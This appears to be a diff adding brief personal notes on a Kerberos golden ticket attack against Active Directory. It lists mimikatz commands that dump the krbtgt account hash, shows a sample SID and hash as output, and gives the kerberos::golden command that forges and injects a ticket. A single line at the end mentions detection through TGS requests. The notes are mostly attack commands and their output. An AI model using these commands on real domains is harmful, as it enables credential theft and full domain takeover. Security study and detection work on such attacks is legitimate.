@@ -1,0 +1,18 @@
+1- dumping the hash of the account krptgt (privilege domain admin, AD admin,Replication)
+# privilege::debug
+#lsadump::lsa /inject /name:krbtgt
+we got 
+krbtgt acount SID:
+S-1-5-21-1797645935-175931118-788172805
+krbtgt account hash:
+9a140b1a68977ef2d7df73595aaede07
+2- ticket injection 
+kerberos::golden /domain:<domain> /sid:<SID> /user:<user> /krbtgt:<hash> /ptt
+
+detection at AD windows LOG
+TGS request with domain admin account 
+--------------------------------------------------------------------------------------------------------
+
+
+
+
